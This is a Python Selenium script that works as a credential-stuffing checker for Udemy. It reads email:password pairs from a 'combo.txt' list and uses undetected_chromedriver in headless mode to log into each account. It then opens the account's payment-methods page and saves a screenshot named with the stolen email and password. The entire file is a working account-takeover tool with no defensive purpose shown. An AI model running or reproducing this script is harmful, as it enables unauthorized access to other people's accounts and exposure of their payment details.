import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os
import colorama
from colorama import Fore
colorama.init()
from time import sleep

def check_login(email , password , browser):
    browser.get("https://www.udemy.com/")
    sleep(4)
    browser.delete_all_cookies(
        
    )
    loginbtn = browser.find_element(By.XPATH,'/html/body/div[1]/div[1]/div[4]/div[6]/a')
    loginbtn.click()
    emailinput = browser.find_element(By.XPATH,"/html/body/div[1]/div[2]/div/div/form/div[1]/div/div/div/input")
    passwordnipt = browser.find_element(By.XPATH,"/html/body/div[1]/div[2]/div/div/form/div[2]/div/div/input")
    subbtn = browser.find_element(By.XPATH,"/html/body/div[1]/div[2]/div/div/form/button")

    emailinput.send_keys(email)
    passwordnipt.send_keys(password)
    subbtn.click()
    sleep(2)
    browser.get("https://www.udemy.com/user/edit-payment-methods/")
    sleep(3)
    if not os.path.exists("screenshots"):
                os.makedirs("screenshots")
            
            # Generate a unique filename based on the current timestamp
    timestamp = int(time.time())
    print(Fore.GREEN + "The Screenshot has been save successfully")
    screenshot_filename = f"screenshots/{email}_{password}.png"
            
            # Save the screenshot to the specified folder
    browser.save_screenshot(screenshot_filename)
if __name__ == '__main__':
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument(r'--user-data-dir=C:\Users\saidl\AppData\Local\Google\Chrome\User Data\Profile 1')
    
    browser = uc.Chrome(options=options)
    
    with open("combo.txt", "r") as combo_file:
        for line in combo_file:
            combo = line.strip().split(":")
            email = combo[0]
            password = combo[1]
            check_login(email, password, browser)

    browser.quit()